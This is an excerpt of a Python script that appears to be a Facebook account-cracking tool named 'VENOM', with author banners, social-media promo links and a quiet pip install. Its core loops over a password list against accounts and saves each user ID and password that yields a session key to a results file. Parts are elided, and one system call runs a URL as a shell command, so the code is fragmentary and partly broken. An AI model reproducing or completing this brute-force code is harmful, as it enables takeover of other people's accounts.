...
try:
    ...
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python VENOM.py')
    os.system('https://chat.whatsapp.com/DmQsXgLf46RLvavWb6y7Y0/')
###############
...
════════════════════════════════════════════════
\033[1;32m  • \033[1;37m Tool Owner :-  ILYAS-KHAN
\033[1;32m  • \033[1;37m GitHub     :-  ILYASkhan420
\033[1;32m  • \033[1;37m Type       :-  FREE but first subscribe my channel 
\033[1;32m  • \033[1;37m Version    :-  {version}""")
os.system('clear')
#print("\033[1;32m [•]\033[1;37m Follow My FaceBook Page...! \033[1;32mThnx");time.sleep(2);os.system('xdg-open https://www.facebook.com/profile.php?id=61551894643643&mibextid=ZbWKwL/')
...
def Main_VENOM():
        ...
        if opt1 == "1": method()
            ...
            d=input(' [•] Choose : ')
            if d == '1':os.system('xdg-open https://api.whatsapp.com/send?phone=+923427941197/');Main_VENOM()
            if d == '2':os.system('xdg-open https://www.facebook.com/profile.php?id=61551894643643&mibextid=ZbWKwL');Main_VENOM()
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    file_path = os.path.join(folder_path, 'ILYAS-FILE-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' √ '+pas+'\n')
                    cps.append(uid)
                    break
